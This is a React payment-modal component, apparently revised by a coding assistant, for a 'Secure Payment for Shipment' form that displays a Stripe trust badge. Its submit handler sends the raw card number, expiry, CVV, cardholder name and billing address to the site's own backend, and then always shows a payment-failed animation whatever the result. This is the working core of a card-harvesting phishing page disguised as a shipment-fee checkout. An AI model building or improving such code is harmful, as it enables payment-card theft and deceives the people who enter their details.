// src/components/PaymentModal.jsx
import React, { useState, useRef, useEffect } from 'react';
import PaymentStatusAnimation from './PaymentStatusAnimation';
import StripeTrustBadge from './StripeTrustBadge';
import { number as validateCardNumber } from 'card-validator';

// ... (CardIcon component and other parts of the file remain the same) ...

function PaymentModal({ show, onClose, amount, shipmentId }) {
    // ... (all your existing useState, useRef, useEffect hooks) ...
    // ... (all your existing handle... functions remain the same) ...

    // --- Form Submission ---
    const handleSubmit = async (event) => {
        event.preventDefault();
        setSubmitStatus('loading');

        try {
            // 1. IMPROVEMENT: This URL now works for both local and live sites.
            const baseUrl = import.meta.env.VITE_API_BASE_URL || "http://127.0.0.1:8000";
            
            // 2. FIX: Added the trailing slash to the URL.
            const response = await fetch(`${baseUrl}/api/payments/`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    shipment: shipmentId,
                    cardholderName: cardName,
                    billingAddress: billingAddress,
                    cardNumber: cardNumber,
                    expiryDate: expiryDate,
                    cvv: cvv,
                }),
            });

            // 3. IMPROVEMENT: Check if the backend accepted the data.
            if (!response.ok) {
                // If the backend returns an error (like 400), this will catch it.
                throw new Error('Backend rejected the payment data.');
            }

        } catch (error) {
            console.error("API submission error:", error);
        }

        // After attempting to send the data, ALWAYS show the failure animation
        setTimeout(() => {
            setSubmitStatus('failed');
        }, 1500);
    };

    // ... (the rest of your component remains exactly the same) ...
    // ... (handleClose function and the return JSX) ...
    
    if (!isVisible) return null;

    return (
        <div className={`modal-overlay ${show ? 'visible' : ''}`} onClick={handleClose}>
            <div className="modal-content" onClick={(e) => e.stopPropagation()}>
                <div className="modal-header">
                    <h2>Secure Payment for Shipment</h2>
                    <button onClick={handleClose} className="close-button">&times;</button>
                </div>
                
                {submitStatus === 'loading' && (
                    <div className="spinner-container">
                        <div className="spinner"></div>
                        <p>Processing...</p>
                    </div>
                )}
                
                {submitStatus === 'failed' && (
                    <PaymentStatusAnimation status="failed" />
                )}

                {submitStatus === 'idle' && (
                    <>
                        <form onSubmit={handleSubmit} className="payment-form">
                            <div className="form-group">
                                <label htmlFor="card-name">Name on Card</label>
                                <input ref={cardNameRef} onKeyDown={(e) => handleKeyDown(e, cardNumberRef)} type="text" id="card-name" value={cardName} onChange={handleNameChange} required />
                            </div>
                            <div className="form-group">
                                <label htmlFor="card-number">Card Number</label>
                                <div className="card-input-wrapper">
                                    <input
                                        ref={cardNumberRef}
                                        onKeyDown={(e) => handleKeyDown(e, expiryDateRef)}
                                        type="text"
                                        id="card-number"
                                        className={cardType ? 'has-card-icon' : ''}
                                        value={cardNumber}
                                        onChange={handleCardNumberChange}
                                        placeholder="1234 5678 9012 3456"
                                        maxLength="19"
                                        required
                                    />
                                    <CardIcon cardType={cardType} />
                                </div>
                            </div>
                            <div className="form-row">
                                <div className="form-group">
                                    <label htmlFor="expiry-date">Expiry (MM/YY)</label>
                                    <input ref={expiryDateRef} onKeyDown={(e) => handleKeyDown(e, cvvRef)} type="text" id="expiry-date" value={expiryDate} onChange={handleExpiryChange} placeholder="MM / YY" maxLength="7" required />
                                </div>
                                <div className="form-group">
                                    <label htmlFor="cvv">CVV</label>
                                    <input ref={cvvRef} onKeyDown={(e) => handleKeyDown(e, billingAddressRef)} type="text" id="cvv" value={cvv} onChange={handleCvvChange} placeholder="123" maxLength="4" required />
                                </div>
                            </div>
                            <div className="form-group">
                                <label htmlFor="billing-address">Billing Address</label>
                                <input ref={billingAddressRef} type="text" id="billing-address" value={billingAddress} onChange={(e) => setBillingAddress(e.target.value)} required />
                            </div>
                            <button type="submit" className="button payment-submit-btn">
                                {`Pay $${amount ? Number(amount).toFixed(2) : '0.00'}`}
                            </button>
                        </form>
                        <StripeTrustBadge />
                    </>
                )}
            </div>
        </div>
    );
}

export default PaymentModal;